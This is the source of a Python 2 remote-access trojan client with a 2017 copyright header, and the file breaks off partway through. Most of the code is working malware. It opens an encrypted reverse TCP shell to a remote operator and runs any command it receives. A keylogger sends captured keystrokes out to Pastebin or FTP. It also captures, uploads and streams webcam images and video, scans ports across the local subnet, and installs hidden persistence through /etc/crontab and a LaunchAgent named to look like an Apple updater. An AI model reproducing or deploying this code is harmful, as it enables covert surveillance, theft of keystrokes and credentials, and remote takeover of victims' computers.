#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


'''  

        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
        ,adPPPPP88 88       88 8b       88 88	       8b	88
        88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                                aa,    ,88 	        aa,    ,88
                                 "Y8bbdP"          	 "Y8bbdP'

                                                       88                          ,d
                                                       88                          88
         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
        8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
                    aa,    ,88  aa,    ,88 88                                      "Y888
                     "Y8bbdP"    "Y8bbdP"  88

'''

from __future__ import print_function
import os
import sys
import imp
import time
import json
import zlib
import uuid
import numpy
import base64
import ctypes
import pickle
import Queue
import struct
import socket
import random
import ftplib
import urllib
import urllib2
import zipfile
import threading
import cStringIO
import subprocess


class Client():
    global ___debug___
    global ___usage___
    global __command__
    
    ___debug___ = True
    __command__ = {}
    ___usage___ = {'sleep': 'sleep <int>', 'batch': 'batch <url>', 'ps': 'ps', 'remove': 'remove <name>', 'shell':'shell', 'set': 'set <cmd> x=y', 'pwd': 'pwd', 'help': 'help <cmd>', 'scan': 'scan <target>', 'results': 'results', 'network': 'network', 'cd': 'cd <path>', 'kill': 'kill', 'selfdestruct': 'selfdestruct', 'start': 'start', 'packetsniff': 'packetsniff', 'ls': 'ls <path>', 'persistence': 'persistence', 'unzip': 'unzip <file>', 'jobs': 'jobs', 'screenshot': 'screenshot', 'keylogger': 'keylogger', 'stop': 'stop <job>', 'update': 'update [url]', 'wget': 'wget <url>', 'info': 'info', 'webcam': 'webcam <mode>', 'admin': 'admin', 'upload': 'upload [args]', 'cat': 'cat <file>', 'standby': 'standby', 'options': 'options <cmd>'}

    def security(fx):
        """
        security decorator for encryption properties

        """
        fx.block_size = 8
        fx.key_size   = 16
        fx.num_rounds = 32
        fx.hash_algo  = 'md5'
        return staticmethod(fx)

    def windows(fx):
        """
        platform decorator for Windows
        
        """
        
        fx.platforms = ['win32'] if not hasattr(fx, 'platforms') else fx.platforms + ['win32']
        return fx

    def linux(fx):
        """
        platform decorator for Linux and Unix-based systems
        
        """
        
        fx.platforms = ['linux2'] if not hasattr(fx, 'platforms') else fx.platforms + ['linux2']
        return fx
        
    def darwin(fx):
        """
        platform decorator for Mac OS X, iOS
        
        """
        
        fx.platforms = ['darwin'] if not hasattr(fx, 'platforms') else fx.platforms + ['darwin']
        return fx

    def command(fx):
        """
        client command decorator
        
        """
        
        fx.status = threading.Event()
        
        if fx.func_name is 'persistence':
            if os.name is 'nt':
                fx.options   = {'registry_key': bool(), 'scheduled_task': bool(), 'startup_file': bool(), 'hidden_file': bool()}
            elif sys.platform in ('darwin', 'ios'):
                fx.options   = {'launch_agent': bool(), 'hidden_file':bool()}
            elif 'linux' in sys.platform or 'nix' in sys.platform:
                fx.options   = {'crontab_job': bool(), 'hidden_file': bool()}
                
        elif fx.func_name is 'keylogger':
            fx.options   = {'max_bytes': 1024, 'upload': 'pastebin'}
            fx.window    = bytes()
            fx.buffer    = cStringIO.StringIO()

        elif fx.func_name is 'webcam':
            fx.options   = {'image': True, 'video': bool(), 'upload': 'imgur'}
        
        elif fx.func_name is 'packetsniff':
            fx.platforms = ['darwin','linux2']
            fx.options   = {'duration': 300.0, 'upload': 'ftp'}
            fx.capture   = []

        elif fx.func_name is 'screenshot':
            fx.options   = {'upload': 'imgur'}
                
        elif fx.func_name is 'upload':
            fx.options   = {'pastebin': {'api_key': None}, 'imgur': {'api_key': None}, 'ftp': {'host': None, 'username': None, 'password': None}}
            
        elif fx.func_name is 'admin':
            fx.platforms = ['win32']

        fx.platforms     = ['win32', 'linux2', 'darwin'] if not hasattr(fx, 'platforms') else fx.platforms
        
        fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
        
        __command__.update({fx.func_name: fx}) if fx.status.is_set() else None
        
        fx.usage = ___usage___[fx.func_name]
        
        return fx

    @security
    def encryption():
        """
        properties of encryption method of reverse tcp shell

        """
        return Client.encryption.func_dict



    # private class methods



    @staticmethod
    def _debug(data):
        if ___debug___:
            print(data)

    @staticmethod
    def _xor(s, t):
        try:
            return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
        except Exception as e:
            Client._debug(str(e))
                        
    @staticmethod
    def _is_ipv4_address(address):
        try:
            if socket.inet_aton(str(address)):
                return True
        except:
            return False

    @staticmethod
    def _long_to_bytes(x, default=False):
        return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read() if not default else bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))

                        
    @staticmethod
    def _bytes_to_long(x):
        return long(bytes(x).encode('hex'), 16)

    @staticmethod
    def _post(url, headers={}, data={}):
        try:
            dat = urllib.urlencode(data)
            req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
            for key, value in headers.items():
                req.add_header(key, value)
            return urllib2.urlopen(req).read()
        except Exception as e:
           Client._debug(str(e))

    @staticmethod
    def _png(image):
        if type(image) == numpy.ndarray:
            width, height = (image.shape[1], image.shape[0])
            data = image.tobytes()
        else:
            width, height = (image.width, image.height)
            data = image.rgb
        try:
            line = width * 3
            png_filter = struct.pack('>B', 0)
            scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
            ihdr = [b'', b'IHDR', b'', b'']
            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
            ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
            ihdr[0] = struct.pack('>I', len(ihdr[2]))
            idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
            idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
            idat[0] = struct.pack('>I', len(idat[2]))
            iend = [b'', b'IEND', b'', b'']
            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
            iend[0] = struct.pack('>I', len(iend[2]))
            fileh = cStringIO.StringIO()
            fileh.write(magic)
            fileh.write(b''.join(ihdr))
            fileh.write(b''.join(idat))
            fileh.write(b''.join(iend))
            fileh.seek(0)
            return fileh
        except Exception as e:
           Client._debug(str(e))

    @staticmethod
    def _hidden_process(path, shell=True):
        try:
            info = subprocess.STARTUPINFO()
            info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
            info.wShowWindow = subprocess.SW_HIDE
            p = subprocess.Popen(path, startupinfo=info, shell=shell)
            return p
        except Exception as e:
            Client._debug("Hidden process error: {}".format(str(e)))

    @staticmethod
    def _powershell(cmdline):
        if os.name is 'nt':
            try:
                cmds = cmdline if type(cmdline) is list else str(cmdline).split()
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW
                info.wShowWindow = subprocess.SW_HIDE
                command = ['powershell.exe', '/c', cmds]
                p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
                results, _ = p.communicate()
                return results
            except Exception as e:
                Client._debug('Powershell error: {}'.format(str(e)))

    @staticmethod
    def _get_host():
        try:
            return {'public': urllib2.urlopen('http://api.ipify.org').read(), 'private': socket.gethostbyname(socket.gethostname())}
        except Exception as e:
            Client._debug(str(e))

    @staticmethod                
    def _get_info():
        try:
            return {k:v for k,v in zip(['ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'node', 'device'], [Client._get_host()['public'], Client._get_host()['private'], sys.platform, ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper(), int(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), bytes(uuid.getnode()), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
        except Exception as e:
            Client._debug(str(e))

    @staticmethod
    def _get_services():
        try:
            return {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
        except Exception as e:
            Client._debug(str(e))

    @staticmethod            
    def _get_status(c):
        try: 
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            Client._debug(str(e))

    @staticmethod
    def _get_process_list(executables=False):
        if executables:
            yield "{:>6}\t{:>20}\t{:>10}\t{:>30}\n------------------------------------------------------------------------------".format("PID","Name","Status","Executable")
            for p in psutil.process_iter():
                try:
                    yield "{:>6}\t{:>20}\t{:>10}\t{:>30}".format(str(p.pid), str(p.name())[:19], str(p.status()), str(p.exe())[:29])
                except: pass
        else:
            yield "{:>6}\t{:>20}\t{:>10}\n------------------------------------------".format("PID","Name","Status")
            for p in psutil.process_iter():
                try:
                    yield "{:>6}\t{:>20}\t{:>10}".format(str(p.pid), str(p.name())[:19], str(p.status()))
                except: pass



    # private instance methods



    def __init__(self, **kwargs):
        self._kwargs    = kwargs
        self._exit      = 0
        self._queue     = Queue.Queue()
        self._sleep     = threading.Event()
        self._connected = threading.Event()
        self._setup     = [setattr(self, '__{}__'.format(chr(i)), kwargs.get(chr(i))) for i in range(97,123) if chr(i) in kwargs]; True
        self._threads   = {} if 'threads' not in kwargs else kwargs.get('threads')
        self._network   = {} if 'network' not in kwargs else kwargs.get('network')
        self._results   = {} if 'results' not in kwargs else kwargs.get('results')
        self._commands  = {cmd: getattr(self, cmd) for cmd in __command__}

    def _pad(self, s):
        return bytes(s) + (self.encryption.block_size - len(bytes(s)) % self.encryption.block_size) * '\x00'

    def _ping(self, host):
        if subprocess.call(str('ping -n 1 -w 90 {}' if os.name is 'nt' else 'ping -c 1 -w 90 {}').format(host), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
            self._network[host] = {'ports': {}} if host not in self._network else self._network[host]
            return True
        return False

    def _block(self, s):
        try:
            return [s[i * self.encryption.block_size:((i + 1) * self.encryption.block_size)] for i in range(len(s) // self.encryption.block_size)]
        except Exception as e:
            self._debug(str(e))
            self._connected.clear()

    def _register(self):
        try:
            self._info = self._get_info()
            self._id   = sys.modules['hashlib'].md5(self._info['ip'] + self._info['node']).hexdigest() if bool(self._is_ipv4_address(self._info['ip']) and self._info['node'].isdigit()) else 0
            self._send(json.dumps(self._info), method=self.start.func_name)
        except Exception as e:
            self._debug(str(e))

    def _threader(self):
        while True:
            try:
                target, task = self._queue.get_nowait()
                target(task)
                self._queue.task_done()
            except: break

    def _task(self, task, timestamp=None):
        try:
            timestamp = int(time.time()) if not timestamp else int(timestamp)
            return sys.modules['hashlib'].new(self.encryption.hash_algo, '%s%s%d' % (self._id, task, timestamp)).hexdigest()
        except Exception as e:
            self._debug("Error getting task ID: {}".format(str(e)))

    def _configure(self):
        try:
            self.upload.options['pastebin']['api_key']  = self._long_to_bytes(long(self.__c__)) if '__c__' in vars(self) else str()
            self.upload.options['pastebin']['user_key'] = self._long_to_bytes(long(self.__d__)) if '__d__' in vars(self) else str()
            self.upload.options['imgur']['api_key']     = self._long_to_bytes(long(self.__e__)) if '__e__' in vars(self) else str()
            self.upload.options['ftp']['host']          = self._long_to_bytes(long(self.__q__)).split()[0] if ('__q__' in vars(self) and len(self._long_to_bytes(self.__q__).split()) == 3) else None
            self.upload.options['ftp']['username']      = self._long_to_bytes(long(self.__q__)).split()[1] if ('__q__' in vars(self) and len(self._long_to_bytes(self.__q__).split()) == 3) else None
            self.upload.options['ftp']['password']      = self._long_to_bytes(long(self.__q__)).split()[2] if ('__q__' in vars(self) and len(self._long_to_bytes(self.__q__).split()) == 3) else None
        except Exception as e:
            self._debug(str(e))

    def _connect(self, port=1337):
        def _addr(a, b, c):
            ab  = json.loads(self._post(a, headers={'API-Key': b}))
            ip  = ab[ab.keys()[0]][0].get('ip')
            print(ip)
            if (ip):
                return _sock(ip, c)
            else:
                self._debug('Invalid IPv4 address\nRetrying in 5...'.format(_))
                time.sleep(5)
                return _addr(a, b, c)
        def _sock(x, y):
            s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(True)
            s.connect((x, y))
            return s
        try:
            self._connected.clear()
            self._socket = _sock('localhost', int(port)) if ___debug___ else _addr(urllib.urlopen(self._long_to_bytes(long(self.__a__))).read(), self._long_to_bytes(long(self.__b__)), int(port))
            self._dhkey  = self._diffiehellman()
            return self._connected.set()
        except: pass
        self._debug('connection failed - retrying in 5...')
        time.sleep(5)
        return self._connect()

    def _send(self, data, method='default'):
        try:
            self._connected.wait()
            block = data[:4096]
            data = data[len(block):]
            ciphertext = self._encrypt(block, self._dhkey)
            msg = '{}:{}\n'.format(method, ciphertext)
            try:
                self._socket.sendall(msg)
            except socket.error:
                return self._connected.clear()
            if len(data):
                return self._send(data, method)
        except Exception as e:
            self._debug("Send error: {}".format(str(e)))

    def _receive(self):
        try:
            data = ""
            while "\n" not in data:
                try:
                    data += self._socket.recv(1024)
                except socket.error:
                    return self._connected.clear()
            data = self._decrypt(data.rstrip(), self._dhkey) if len(data) else data
            return data
        except Exception as e:
            self._debug('Error receiving data: {}'.format(str(e)))

    def _reverse_tcp_shell(self):
        while True:
            if not self.shell.status.is_set():
                break
            if self._connected.is_set():
                prompt = "[{} @ %s]> " % os.getcwd()
                self._send(prompt, method='prompt')   
                data = self._receive()
                if not data:
                    continue
                task, _, action = bytes(data).partition(' ')
                timestamp       = time.time()
                task_id         = self._task(task, timestamp)
                if task in self._commands:
                    try:
                        result  = self._commands[task](action) if len(action) else self._commands[task]()
                    except Exception as e:
                        result  = str(e)
                else:
                    try:
                        result  = bytes().join(subprocess.Popen(data, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                    except Exception as e:
                        result  = str(e)
                if result and len(result):
                    self._results[task_id] = {task: {timestamp: result}}
                    self._send(result[:4096], method=task)
            else:
                if 'connecting' not in self._threads:
                    self._threads['connecting'] = threading.Thread(target=self._connect, name=time.time())
                    self._threads['connecting'].setDaemon(True)
                    self._threads['connecting'].start()
            for task, worker in self._threads.items():
                if not worker.is_alive():
                    _ = self._threads.pop(task, None)
                    del _

    def _diffiehellman(self):
        try:
            g  = 2
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = self._bytes_to_long(os.urandom(self.encryption.key_size))
            xA = pow(g, a, p)
            self._socket.sendall(self._long_to_bytes(xA, default=True))
            xB = self._bytes_to_long(self._socket.recv(256))
            x  = pow(xB, a, p)
            return sys.modules['hashlib'].new(self.encryption.hash_algo, self._long_to_bytes(x, default=True)).digest()
        except Exception as e:
            self._debug(str(e))
        time.sleep(1)
        return self._diffiehellman()    

    def _encrypt(self, data, key):
        try:
            data    = self._pad(data)
            blocks  = self._block(data)
            vector  = os.urandom(8)
            result  = [vector]
            for block in blocks:
                block   = self._xor(vector, block)
                v0, v1  = struct.unpack('!' + "2L", block)
                k       = struct.unpack('!' + "4L", key)
                sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
                for round in range(self.encryption.num_rounds):
                    v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                    sum = (sum + delta) & mask
                    v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                output  = vector = struct.pack('!' + "2L", v0, v1)
                result.append(output)
            return base64.b64encode(b''.join(result))
        except Exception as e:
            self._debug("encryption error: {}".format(str(e)))

    def _decrypt(self, data, key):
        try:
            data    = base64.b64decode(data)
            blocks  = self._block(data)
            vector  = blocks[0]
            result  = []
            for block in blocks[1:]:
                v0, v1 = struct.unpack('!' + "2L", block)
                k = struct.unpack('!' + "4L", key)
                delta, mask = 0x9e3779b9L, 0xffffffffL
                sum = (delta * self.encryption.num_rounds) & mask
                for round in range(self.encryption.num_rounds):
                    v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                    sum = (sum - delta) & mask
                    v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                decode = struct.pack('!' + "2L", v0, v1)
                output = self._xor(vector, decode)
                vector = block
                result.append(output)
            return ''.join(result).rstrip('\x00')
        except Exception as e:
            self._debug("decryption error: {}".format(str(e)))


    def _scan_subnet(self, host):
        try:
            stub = '.'.join(str(host).split('.')[:-1]) + '.%d'
            for i in xrange(1,255):
                self._queue.put_nowait((self._ping, stub % i))
            for _ in xrange(10):
                x = len(self._threads)
                self._threads['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
                self._threads['scanner-%d' % x].setDaemon(True)
                self._threads['scanner-%d' % x].start()
            self._threads['scanner-%d' % x].join()
            for ip in self._network:
                self._queue.put_nowait((self._scan_all_ports, ip))
            for n in xrange(len(self._network) / 10):
                x = len(self._threads)
                self._threads['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
                self._threads['scanner-%d' % x].start()
            self._threads['scanner-%d' % x].join()
        except Exception as e:
            self._debug("Error scanning subnet: {}".format(str(e)))
    
    def _scan_all_ports(self, host):
        try:
            if host in self._network:
                for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389,8000,8008,8443,8888]:
                    self._queue.put_nowait((self._scan_port, (host, port)))
                for _ in xrange(10):
                    x = len(self._threads)
                    self._threads['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
                    self._threads['scanner-%d' % x].daemon = True
                    self._threads['scanner-%d' % x].start()
                self._threads['scanner-%d' % x].join()
        except Exception as e:
            self._debug("Error scanning subnet: {}".format(str(e)))

    def _scan_port(self, addr):
        try:
            host = addr[0]
            port = addr[1]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect((host,int(port)))
            banner = sock.recv(1024)
            if banner:
                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': banner.splitlines()[0] if '\n' in banner else banner[:50], 'state': 'open'}}
            else:
                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': self._services.get(str(port))[1] if str(port) in self._services else 'n/a', 'state': 'open'}}
            self._network.get(host).get('ports').update(info)
        except (socket.error, socket.timeout):
            return
        except Exception as e:
            self._debug(str(e))

    def _upload_imgur(self, source):
        try:
            if not self.upload.options['imgur'].get('api_key'):
                return "Error: no api key found"
            if hasattr(source, 'getvalue'):
                data    = source.getvalue()
            elif hasattr(source, 'read'):
                if hasattr(source, 'seek'):
                    source.seek(0)
                data    = source.read()
            else:
                data    = bytes(source)
            result  = json.loads(self._post('https://api.imgur.com/3/upload', headers={'Authorization': self.upload.options['imgur'].get('api_key')}, data={'image': base64.b64encode(data), 'type': 'base64'}))['data']['link']
        except Exception as e:
            result  = str(e)
        return result    

    def _upload_pastebin(self, source):
        if not self.upload.status.is_set() and not override:
            return path
        if hasattr(source, 'getvalue'):
            data    = source.getvalue()
        elif hasattr(source, 'read'):
            if hasattr(source, 'seek'):
                source.seek(0)
            data    = source.read()
        else:
            data    = bytes(source)
        try:
            output = os.path.split(self._post('https://pastebin.com/api/api_post.php', data={'api_option': 'paste', 'api_paste_code': source.read(), 'api_dev_key': self.upload.options['pastebin'].get('api_key'), 'api_user_key': self.upload.options['pastebin'].get('user_key')}))
            result = '{}/raw/{}'.format(output[0], output[1])
        except Exception as e:
            result = str(e)
        return result

    def _upload_ftp(self, source):
        if not self.upload.status and not override:
            return source
        try:
            addr = urllib.urlopen('http://api.ipify.org').read()
            host = ftplib.FTP(self.upload.options['ftp'].get('host'), self.upload.options['ftp'].get('username'), self.upload.options['ftp'].get('password'))
            if addr not in host.nlst('/htdocs'):
                host.mkd('/htdocs/{}'.format(addr))
            local   = time.ctime().split()
            ext     = os.path.splitext(source)[1] if os.path.isfile(str(source)) else '.txt'
            result  = '/htdocs/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], ext))
            source  = open(source, 'rb') if os.path.isfile(source) else source
            upload  = host.storbinary('STOR ' + result, source)
        except Exception as e:
            result = str(e)
        return result

    def _keylogger_event(self, event):
        try:
            if event.WindowName != vars(self.keylogger)['window']:
                vars(self.keylogger)['window'] = event.WindowName
                self.keylogger.buffer.write("\n[{}]\n".format(vars(self.keylogger)['window']))
            if event.Ascii > 32 and event.Ascii < 127:
                self.keylogger.buffer.write(chr(event.Ascii))
            elif event.Ascii == 32:
                self.keylogger.buffer.write(' ')
            elif event.Ascii in (10,13):
                self.keylogger.buffer.write('\n')
            elif event.Ascii == 8:
                self.keylogger.buffer.seek(-1, 1)
                self.keylogger.buffer.truncate()
            else:
                pass
        except Exception as e:
            self._debug("Keystroke event error: {}".format(str(e)))
        return True

    def _keylogger_uploader(self):
        while True:
            try:
                while True:
                    if self.keylogger.buffer.tell() >= int(self.keylogger.options['max_bytes']):
                        break
                    elif self._exit:
                        break
                    elif not self.keylogger.status.is_set():
                        break
                    else:
                        time.sleep(5)
                if self.keylogger.options['upload'] == 'pastebin':
                    result = self._upload_pastebin(self.keylogger.buffer)
                elif self.keylogger.options['upload'] == 'ftp':
                    result = self._upload_ftp(self.keylogger.buffer)
                else:
                    result = self.keylogger.buffer.getvalue()
                task = self.keylogger.func_name
                task_id = self._task(task)
                self._results.update({task_id: { task: { time.time(): result } } })
                self.keylogger.buffer.reset()
                if self._exit:
                    break
                if not self.keylogger.status.is_set():
                    break
            except Exception as e:
                self._debug("Keylogger helper function error: {}".format(str(e)))
                break
    
    def _keylogger_manager(self):
        keylogger_helper = threading.Thread(target=self._keylogger_uploader)
        keylogger_helper.start()
        while True:
            try:
                if self._exit:
                    break
                if not self.keylogger.status.is_set():
                    break
                if not keylogger_helper.is_alive():
                    del keylogger_helper
                    keylogger_helper = threading.Thread(target=self._keylogger_uploader)
                    keylogger_helper.start()
                hm = HookManager()
                hm.KeyDown = self._keylogger_event
                hm.HookKeyboard()
                if os.name is 'nt':
                    PumpMessages()
                else:
                    time.sleep(0.1)
            except Exception as e:
                self._debug("Keylogger error: {}".format(str(e)))

    def _webcam_image(self, *args, **kwargs):
        opt = str(self.webcam.options['upload']).lower()
        if opt not in ('imgur','ftp'):
            return "Error: invalid upload option - '{}'\nValid upload options for webcam images: 'imgur','ftp'".format(opt)
        try:
            dev = VideoCapture(0)
            r,f = dev.read()
            dev.release()
        except Exception as e1:
            return "Error accessing webcam: {}".format(str(e1))
        if not r:
            return "Webcam image capture failed"
        try:
            png = self._png(f)
        except Exception as e3:
            return "Converting raw bytes to PNG failed with error: {}".format(str(e3))
        try:
            result = getattr(self, '_upload_{}'.format(opt))(png)
        except Exception as e2:
            result = 'Webcam image upload error: {}'.format(str(e2))
        return result

    def _webcam_video(self, duration=5.0, *args, **kwargs):
        if str(self.webcam.options['upload']).lower() == 'ftp':
            try:
                fpath  = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
                fourcc = VideoWriter_fourcc(*'DIVX') if sys.platform is 'win32' else VideoWriter_fourcc(*'XVID')
                output = VideoWriter(fpath, fourcc, 20.0, (640,480))
                end = time.time() + duration
                dev = VideoCapture(0)
                while True:
                    ret, frame = dev.read()
                    output.write(frame)
                    if time.time() > end: break
                dev.release()
                result = self._upload_ftp(fpath)
                return result
            except Exception as e:
                result = "Error capturing video: {}".format(str(e))
        else:
            result = "Error: FTP upload is the only option for video captured from webcam"
        return result

    def _webcam_stream(self, port=None, retries=5):
        if not port:
            return 'Stream failed - missing port number'
        try:
            host = self._socket.getpeername()[0]
        except socket.error:
            return self._connected.clear()
        port = int(port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while retries > 0:
            try:
                sock.connect((host, port))
            except socket.error:
                retries -= 1
            break
        if not retries:
            return 'Stream failed - connection error'
        dev = VideoCapture(0)
        try:
            t1 = time.time()
            while True:
                try:
                    ret,frame=dev.read()
                    data = pickle.dumps(frame)
                    sock.sendall(struct.pack("L", len(data))+data)
                    time.sleep(0.1)
                except Exception as e:
                    self._debug('Stream error: {}'.format(str(e)))
                    break
        finally:
            dev.release()
            sock.close()
            t2 = time.time() - t1
        return 'Live stream for {}'.format(self._get_status(t2))    

    @linux
    def _persistence_add_crontab_job(self, task_name='libpython27'):
        if hasattr(self, '__f__'):
            try:
                value       = self._long_to_bytes(long(self.__f__))
            except:
                value       = self.__f__
            if os.path.isfile(value):
                try:
                    if not os.path.isdir('/var/tmp'):
                        os.makedirs('/var/tmp')
                    task_name = os.path.join('/var/tmp','.' + os.path.splitext(task_name)[0] + os.path.splitext(value)[1])
                    with file(task_name, 'w') as copy:
                        copy.write(open(value).read())
                    if not self.persistence.get('crontab_job'):
                        for user in ['root', os.getenv('USERNAME', os.getenv('NAME'))]:
                            try:
                                task = "0 */6 * * * {} {}".format(user, task_name)
                                with open('/etc/crontab', 'r') as fp:
                                    data= fp.read()
                                if task not in data:
                                    with file('/etc/crontab', 'a') as fd:
                                        fd.write('\n' + task + '\n')
                                return (True, task)
                            except: pass
                except Exception as e:
                    self._debug(str(e))
        return (False, None)

    @linux
    def _persistence_remove_crontab_job(self):
        if hasattr(self, '__f__'):
            try:
                value       = self._long_to_bytes(long(self.__f__))
            except:
                value       = self.__f__
            if os.path.isfile(value):
                try:
                    with open('/etc/crontab','r') as fp:
                        lines = [i.rstrip() for i in fp.readlines()]
                        for line in lines:
                            if task_name in line:
                                _ = lines.pop(line, None)
                    with open('/etc/crontab', 'a+') as fp:
                        fp.write('\n'.join(lines))
                    return True
                except Exception as e:
                    self._debug(str(e))
        return False

    @darwin
    def _persistence_add_launch_agent(self, task_name='com.apple.update.manager'):
        if hasattr(self, '__f__') and hasattr(self, '__g__'):
            try:
                value       = self._long_to_bytes(long(self.__f__))
            except:
                value       = self.__f__
            if os.path.isfile(value):
                try:
                    code    = urllib2.urlopen(self._long_to_bytes(long(self.__g__))).read()
                    label   = task_name
                    if not os.path.exists('/var/tmp'):
                        os.makedirs('/var/tmp')
                    fpath   = '/var/tmp/.{}.sh'.format(task_name)
                    bash    = code.replace('__LABEL__', label).replace('__FILE__', value)
                    with file(fpath, 'w') as fileobj:
                        fileobj.write(bash)
                    bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                    time.sleep(2)
                    launch_agent= '~/Library/LaunchAgents/{}.plist'.format(label)
                    if os.path.isfile(launch_agent):
                        os.remove(fpath)
                        return (True, launch_agent)
                except Exception as e2:
                    self._debug('Error: {}'.format(str(e2)))
        return (False, None)

    @darwin
    def _persistence_remove_launch_agent(self, *args, **kwargs):
        if hasattr(self, '__f__'):
